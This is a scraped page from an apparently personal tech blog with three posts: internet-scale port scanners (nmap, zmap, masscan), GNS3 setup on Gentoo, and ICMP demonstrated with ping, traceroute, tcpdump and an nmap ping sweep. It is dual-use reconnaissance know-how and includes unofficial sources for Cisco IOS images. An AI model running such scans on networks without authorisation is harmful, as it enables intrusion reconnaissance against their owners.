</span>  -<span class="ruby"><span class="symbol">v:</span> <span class="constant">Increase</span> verbosity level (use -vv <span class="keyword">or</span> more <span class="keyword">for</span> greater effect)
</span>  -<span class="ruby"><span class="symbol">d:</span> <span class="constant">Increase</span> debugging level (use -dd <span class="keyword">or</span> more <span class="keyword">for</span> greater effect)
</span>  -<span class="ruby">-<span class="symbol">reason:</span> <span class="constant">Display</span> the reason a port is <span class="keyword">in</span> a particular state
</span>  -<span class="ruby">-<span class="symbol">open:</span> <span class="constant">Only</span> show open (<span class="keyword">or</span> possibly open) ports
</span>  -<span class="ruby">-packet-<span class="symbol">trace:</span> <span class="constant">Show</span> all packets sent <span class="keyword">and</span> received
</span>  -<span class="ruby">-<span class="symbol">iflist:</span> <span class="constant">Print</span> host interfaces <span class="keyword">and</span> routes (<span class="keyword">for</span> debugging)
</span>  -<span class="ruby">-log-<span class="symbol">errors:</span> <span class="constant">Log</span> errors/warnings to the normal-format output file
</span>  -<span class="ruby">-append-<span class="symbol">output:</span> <span class="constant">Append</span> to rather than clobber specified output files
</span>  -<span class="ruby">-resume &lt;filename&gt;<span class="symbol">:</span> <span class="constant">Resume</span> an aborted scan
</span>  -<span class="ruby">-stylesheet &lt;path/<span class="constant">URL</span>&gt;<span class="symbol">:</span> <span class="constant">XSL</span> stylesheet to transform <span class="constant">XML</span> output to <span class="constant">HTML</span>
</span>  -<span class="ruby">-<span class="symbol">webxml:</span> <span class="constant">Reference</span> stylesheet from <span class="constant">Nmap</span>.<span class="constant">Org</span> <span class="keyword">for</span> more portable <span class="constant">XML</span>
</span>  -<span class="ruby">-no-<span class="symbol">stylesheet:</span> <span class="constant">Prevent</span> associating of <span class="constant">XSL</span> stylesheet w/<span class="constant">XML</span> output
</span>MISC:
  -<span class="ruby"><span class="number">6</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">IPv6</span> scanning
</span>  -<span class="ruby"><span class="constant">A</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">OS</span> detection, version detection, script scanning, <span class="keyword">and</span> traceroute
</span>  -<span class="ruby">-datadir &lt;dirname&gt;<span class="symbol">:</span> <span class="constant">Specify</span> custom <span class="constant">Nmap</span> data file location
</span>  -<span class="ruby">-send-eth/--send-<span class="symbol">ip:</span> <span class="constant">Send</span> using raw ethernet frames <span class="keyword">or</span> <span class="constant">IP</span> packets
</span>  -<span class="ruby">-<span class="symbol">privileged:</span> <span class="constant">Assume</span> that the user is fully privileged
</span>  -<span class="ruby">-<span class="symbol">unprivileged:</span> <span class="constant">Assume</span> the user lacks raw socket privileges
</span>  -<span class="ruby"><span class="constant">V</span><span class="symbol">:</span> <span class="constant">Print</span> version number
</span>  -<span class="ruby"><span class="symbol">h:</span> <span class="constant">Print</span> this help summary page.
</span>EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
</code></pre><h2 id="zmap">zmap</h2><p>Zmap是一个开源网络扫描器，旨在帮助研究人员轻松扫描互联网。通过单个机器和可观的上行量，zmap可以在45分钟内扫描整个IPv4地址段，达到以太网的理论上限。</p>
<p>zmap可以研究随时间变化协议的采用情况。检测互联网上可用的服务，让我们更好的理解分布在互联网上的大系统。</p>
<p>详细用法见：<a href="https://zmap.io/documentation.html" target="_blank" rel="external">Zmap Documentation</a></p>
<p>Zmap是强有力的工具，但请尊重他人和当地法律。</p>
<h2 id="masscan">masscan</h2><p>号称最快的互联网端口扫描器，它能够在6分钟内扫遍整个互联网，每秒发送十个百万数据包。</p>
<p>它生成类似<code>nmap</code>的结果，但内部机理是类似<code>scanrand</code>、<code>unicornscan</code>和<code>zmap</code>异步传输。主要的区别是比它们都快(笑)。另外，它更灵活，允许任意的地址段和端口段。</p>
<p>自由软件。</p>
<pre><code>~/ ⮀ masscan <span class="comment">--help</span>
MASSCAN is a fast port scanner. The primary input parameters are the
IP addresses/ranges you want to scan, and the port numbers. An example
is the following, which scans the 10.x.x.x network for web servers:
 masscan 10.0.0.0/8 -p80
The program auto-detects network interface/adapter settings. If this
fails, you'll have to <span class="operator"><span class="keyword">set</span> these manually. The <span class="keyword">following</span> <span class="keyword">is</span> an
example <span class="keyword">of</span> all the <span class="keyword">parameters</span> that <span class="keyword">are</span> needed:
 <span class="comment">--adapter-ip 192.168.10.123</span>
 <span class="comment">--adapter-mac 00-11-22-33-44-55</span>
 <span class="comment">--router-mac 66-55-44-33-22-11</span>
<span class="keyword">Parameters</span> can be <span class="keyword">set</span> either via the command-line <span class="keyword">or</span> config-<span class="keyword">file</span>. The
<span class="keyword">names</span> <span class="keyword">are</span> the same <span class="keyword">for</span> <span class="keyword">both</span>. Thus, the above adapter <span class="keyword">settings</span> would
appear <span class="keyword">as</span> <span class="keyword">follows</span> <span class="keyword">in</span> a configuration <span class="keyword">file</span>:
 adapter-ip = <span class="number">192.168</span><span class="number">.10</span><span class="number">.123</span>
 adapter-mac = <span class="number">00</span>-<span class="number">11</span>-<span class="number">22</span>-<span class="number">33</span>-<span class="number">44</span>-<span class="number">55</span>
 router-mac = <span class="number">66</span>-<span class="number">55</span>-<span class="number">44</span>-<span class="number">33</span>-<span class="number">22</span>-<span class="number">11</span>
All single-dash <span class="keyword">parameters</span> have a spelled <span class="keyword">out</span> <span class="keyword">double</span>-dash equivalent,
so <span class="string">'-p80'</span> <span class="keyword">is</span> the same <span class="keyword">as</span> <span class="string">'--ports 80'</span> (<span class="keyword">or</span> <span class="string">'ports = 80'</span> <span class="keyword">in</span> config <span class="keyword">file</span>).
<span class="keyword">To</span> <span class="keyword">use</span> the config <span class="keyword">file</span>, <span class="keyword">type</span>:
 masscan -<span class="keyword">c</span> &lt;filename&gt;
<span class="keyword">To</span> generate a config-<span class="keyword">file</span> <span class="keyword">from</span> the <span class="keyword">current</span> <span class="keyword">settings</span>, <span class="keyword">use</span> the <span class="comment">--echo</span>
<span class="keyword">option</span>. This stops the program <span class="keyword">from</span> actually running, <span class="keyword">and</span> just echoes
the <span class="keyword">current</span> configuration instead. This <span class="keyword">is</span> a useful way <span class="keyword">to</span> generate
your <span class="keyword">first</span> config <span class="keyword">file</span>, <span class="keyword">or</span> see a <span class="keyword">list</span> <span class="keyword">of</span> <span class="keyword">parameters</span> you didn<span class="string">'t know
about. I suggest you try it now:
 masscan -p1234 --echo</span></span>
</code></pre><p><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">Masscan github页面</a><br><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html" target="_blank" rel="external">Masscan: the entire Internet in 3 minutes </a></p>
<h2 id="自制扫描器">自制扫描器</h2><p>没啥好说的，拿这gevent写啊……暂时不开源。通常我先用zmap扫端口，然后送给自己的扫描器去扫。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/04/03/gns3-on-gentoo-linux/" itemprop="url">
                  GNS3 on Gentoo Linux
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-04-03T00:00:00+08:00" content="2014-04-03">
              2014-04-03
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/04/03/gns3-on-gentoo-linux/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/04/03/gns3-on-gentoo-linux/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="Install_and_Configure_GNS3">Install and Configure GNS3</h2><p>First, You should install gns3:</p>
<pre><code>sudo emerge <span class="comment">--autounmask-write gns3</span>
sudo <span class="built_in">dispatch</span>-conf
sudo emerge gns3
</code></pre><p>Then you need to prepare for ios images, You can download them from:</p>
<pre><code><span class="string">ftp:</span><span class="comment">//ftp.unikon-ua.net/pub/Cisco/IOS/</span>
<span class="string">http:</span><span class="comment">//115.com/file/clsclmjb</span>
</code></pre><p>Then you should configure them:</p>
<pre><code>Edit&gt;IOS Images <span class="keyword">and</span> Hypervisors
</code></pre><p>And calculate ‘Idle PC’。</p>
<p>You may want to get rid of warning of <code>baseconfig.txt</code>, refer to:</p>
<pre><code><span class="string">http:</span><span class="comment">//forum.gns3.net/post12717.html</span>
</code></pre><p>If you are using KDE, you may use konsole’s preconfigured terminal commands.</p>
<pre><code>Edit&gt;Preferences&gt;<span class="keyword">General</span>&gt;Terminal Settings
</code></pre><p>You need to install and configure virtualbox at <code>Edit&gt;Preferences&gt;VirtualBox</code>:</p>
<ul>
<li><p>modify <code>Path to vboxwrapper</code> to:</p>
<pre><code><span class="regexp">/usr/</span>libexec<span class="regexp">/gns3/</span>vboxwrapper.py
</code></pre></li>
<li><p>emerge virtualbox with sdk and python USE flags</p>
</li>
<li><p>install vboxapi:</p>
<pre><code>cd /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">virtualbox</span>/<span class="title">sdk</span>/<span class="title">installer</span>/</span>
export <span class="constant">VBOX_INSTALL_PATH</span>=<span class="regexp">/usr/lib</span><span class="regexp">/virtualbox/</span>
python vboxapisetup.py install
</code></pre></li>
<li><p>install xdotool(It’s quite an interesting tool!)</p>
<pre><code><span class="title">sudo</span> emerge xdotool
</code></pre></li>
<li>add virtual system:<pre><code><span class="keyword">Edit</span>&gt;Preferences&gt;VirtualBox&gt;VirtualBox Guest
</code></pre></li>
</ul>
<p>You need to install qemu at <code>Edit&gt;Preferences&gt;Qemu</code>:</p>
<ul>
<li><p>modify <code>Path to qemu</code>:</p>
<pre><code>qemu-<span class="keyword">system</span>-x86_64
</code></pre></li>
<li><p>modify path to qemuwrapper to:</p>
<pre><code><span class="regexp">/usr/</span>libexec<span class="regexp">/gns3/</span>qemuwrapper.py
</code></pre></li>
<li><p>kernel should support kvm-intel:</p>
<pre><code> ⮀ ~ ⮀ lsmod|grep kvm
kvm_intel             <span class="number">117933</span>  <span class="number">0</span> 
kvm                   <span class="number">225670</span>  <span class="number">1</span> kvm_intel
</code></pre></li>
<li><p>and add you user to:</p>
<p>  gpasswd -a username kvm</p>
</li>
<li><p>add virtual system, which can be <code>vdi</code></p>
</li>
<li><p>If you want to use PIX firewall, download pemu from <a href="http://sourceforge.net/projects/gns-3/files/Pemu/2008-03-03/pemu_2008-03-03_bin.tar.bz2/download" target="_blank" rel="external">Sourceforge</a> and cp them to the directory which has <code>qemuwrapper.py</code>. You can reffer to: <a href="http://www.gns3.net/documentation/gns3/pix-firewall-emulation/" target="_blank" rel="external">http://www.gns3.net/documentation/gns3/pix-firewall-emulation/</a></p>
</li>
<li><p>if you re-compile kernel, don’t forget to re-compile kernel modules for virtualbox and modprobe them</p>
</li>
</ul>
<h2 id="More_configuration">More configuration</h2><p>More configuration and downloads(I tried and failed, do not know what is actually is and how to use it):</p>
<ul>
<li><a href="http://xinchq2011.blog.51cto.com/2086938/1256837" target="_blank" rel="external">分享–实现用GNS3模拟 PC，PIX，Juniper，ASA，IPS的应用 (中文)</a></li>
</ul>
<h2 id="A_Simple_Test">A Simple Test</h2><ul>
<li>Calc idle PC, very important!!</li>
</ul>
<p>configure the router with the help of <a href="http://www.linkwan.com/gb/routertech/routerbase/ciscomanual/015.htm" target="_blank" rel="external">OSPF configure(中文)</a></p>
<p>A better choice to learn without these configuration, try <a href="http://sourceforge.net/projects/gns3workbench/files/v5.8/" target="_blank" rel="external">GNS3 WorkBench</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/03/15/play-icmp/" itemprop="url">
                  Playing and Learning ICMP in Action
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-03-15T00:00:00+08:00" content="2014-03-15">
              2014-03-15
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/03/15/play-icmp/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/03/15/play-icmp/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>ICMP协议是IP协议的一部分，虽然它的包被封装在IP包内，好像是IP上层的协议，但它确实是IP协议不可分割的一部分。ICMP协议非常复杂，它用来提供有关网络的消息。</p>
<p>ICMP通常被用来侦查网络。各种ICMP报文甚至可能绕过防火墙探查内网，探测访问控制列表等。</p>
<p>ICMP有时也会被利用来做路由重定向和DDOS等其它用途。</p>
<h2 id="ping和traceroute">ping和traceroute</h2><p>ping可以用来判断一个ip地址(当提供域名时一般会解析成ip)对应的机器是否在线。</p>
<p>traceroute则为了探测一个包到目的地所经过的路由。</p>
<p><code>ping</code>利用了<code>ICMP echo request</code>和<code>ICMP echo reply</code>。而<code>traceroute</code>则利用了<code>ICMP time-exceeded error message</code>。</p>
<p>我们可以先<code>ping</code>和<code>traceroute</code>来实际看下，</p>
<pre><code> ~ ⮀ ping -c <span class="number">1</span> baidu.com
PING baidu.com (<span class="number">220.181</span><span class="number">.111</span><span class="number">.86</span>) <span class="number">56</span>(<span class="number">84</span>) <span class="keyword">bytes</span> <span class="operator">of</span> data.
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">220.181</span><span class="number">.111</span><span class="number">.86</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">50</span> <span class="built_in">time</span>=<span class="number">2.07</span> ms

<span class="comment">--- baidu.com ping statistics ---</span>
<span class="number">1</span> packets transmitted, <span class="number">1</span> received, <span class="number">0</span>% packet loss, <span class="built_in">time</span> <span class="number">0</span>ms
rtt <span class="built_in">min</span>/<span class="built_in">avg</span>/<span class="built_in">max</span>/mdev = <span class="number">2.070</span>/<span class="number">2.070</span>/<span class="number">2.070</span>/<span class="number">0.000</span> ms

 ~ ⮀ sudo tcpdump -X <span class="string">"icmp"</span> 
tcpdump: verbose output suppressed, use -v <span class="operator">or</span> -vv <span class="keyword">for</span> full protocol decode
listening <span class="command"><span class="keyword">on</span> <span class="title">eth0</span>, <span class="title">link-type</span> <span class="title">EN10MB</span> (<span class="title">Ethernet</span>), <span class="title">capture</span> <span class="title">size</span> <span class="title">65535</span> <span class="title">bytes</span></span>
<span class="number">18</span>:<span class="number">16</span>:<span class="number">47.917236</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">220.181</span><span class="number">.111</span><span class="number">.86</span>: ICMP echo request, id <span class="number">9095</span>, seq <span class="number">1</span>, <span class="built_in">length</span> <span class="number">64</span>
<span class="number">18</span>:<span class="number">16</span>:<span class="number">47.919293</span> IP <span class="number">220.181</span><span class="number">.111</span><span class="number">.86</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>: ICMP echo reply, id <span class="number">9095</span>, seq <span class="number">1</span>, <span class="built_in">length</span> <span class="number">64</span>
</code></pre><p>如果用<code>wireshark</code>就能看得更加清楚了，懒得截图。</p>
<p>我们接着看看traceroute是什么样的。</p>
<pre><code> ~ ⮀ <span class="tag">traceroute</span> <span class="tag">bbs</span><span class="class">.byr</span><span class="class">.cn</span>
<span class="tag">traceroute</span> <span class="tag">to</span> <span class="tag">bbs</span><span class="class">.byr</span><span class="class">.cn</span> (10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>), 30 <span class="tag">hops</span> <span class="tag">max</span>, 60 <span class="tag">byte</span> <span class="tag">packets</span>
 1  10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> (10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span>)  3<span class="class">.360</span> <span class="tag">ms</span>  3<span class="class">.637</span> <span class="tag">ms</span>  3<span class="class">.919</span> <span class="tag">ms</span>
 2  10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span> (10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span>)  1<span class="class">.511</span> <span class="tag">ms</span>  1<span class="class">.657</span> <span class="tag">ms</span>  1<span class="class">.825</span> <span class="tag">ms</span>
 3  10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span> (10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span>)  1<span class="class">.834</span> <span class="tag">ms</span>  2<span class="class">.422</span> <span class="tag">ms</span>  2<span class="class">.809</span> <span class="tag">ms</span>
 4  10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> (10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span>)  0<span class="class">.512</span> <span class="tag">ms</span>  0<span class="class">.524</span> <span class="tag">ms</span>  0<span class="class">.531</span> <span class="tag">ms</span>
 5  10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> (10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span>)  1<span class="class">.719</span> <span class="tag">ms</span>  2<span class="class">.021</span> <span class="tag">ms</span>  2<span class="class">.139</span> <span class="tag">ms</span>
 6  10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> (10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>)  0<span class="class">.946</span> <span class="tag">ms</span>  0<span class="class">.493</span> <span class="tag">ms</span>  0<span class="class">.483</span> <span class="tag">ms</span>

 ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> <span class="tag">-i</span> <span class="tag">eth0</span> "<span class="tag">not</span> <span class="tag">udp</span> <span class="tag">and</span> <span class="tag">not</span> <span class="tag">arp</span>"
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.471441</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.471566</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472026</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472089</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472106</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472113</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.100</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472120</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">udp</span> <span class="tag">port</span> 33449 <span class="tag">unreachable</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472207</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">udp</span> <span class="tag">port</span> 33450 <span class="tag">unreachable</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472218</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">udp</span> <span class="tag">port</span> 33451 <span class="tag">unreachable</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472227</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472536</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472756</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.472765</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473175</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.193</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473192</span> <span class="tag">IP</span> 10<span class="class">.2</span><span class="class">.1</span><span class="class">.1</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 36
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473196</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473442</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
23<span class="pseudo">:36</span><span class="pseudo">:21</span><span class="class">.473603</span> <span class="tag">IP</span> 10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> <span class="tag">time</span> <span class="tag">exceeded</span> <span class="tag">in-transit</span>, <span class="tag">length</span> 68
</code></pre><p>可以用<code>wireshark</code>更详细的检查。</p>
<p>我们接着看看其它东西。</p>
<h2 id="ping扫射和广播ICMP">ping扫射和广播ICMP</h2><p>ping扫射会<code>ping</code> 一个网段内所有的主机，判断ip所对应的主机是否在线。速度非常快</p>
<p>先试着一个ping sweep，在LAN下nmap如果不明确禁止，一定会使用arp来ping，所以要看看ICMP如何完成ping就禁用它, 然后抓包。</p>
<pre><code> ~ ⮀ sudo nmap -sP <span class="comment">--disable-arp 10.210.96.0/27</span>

Starting Nmap 6.25 ( http://nmap.org ) at 2014-03-21 19:29 CST
Nmap scan report for 10.210.96.1
Host is up (0.0014s latency).
Nmap scan report for 10.210.96.13
Host is up (0.0023s latency).
Nmap done: 32 IP addresses (2 hosts up) scanned in 1.97 seconds

 ~ ⮀ sudo tcpdump "icmp"
 tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
 listening <span class="keyword">on</span> eth0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205871</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.1</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">15450</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205895</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.2</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">39828</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205901</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.3</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">26191</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205907</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.4</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">27927</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205911</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.5</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">40326</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205917</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.6</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">20451</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
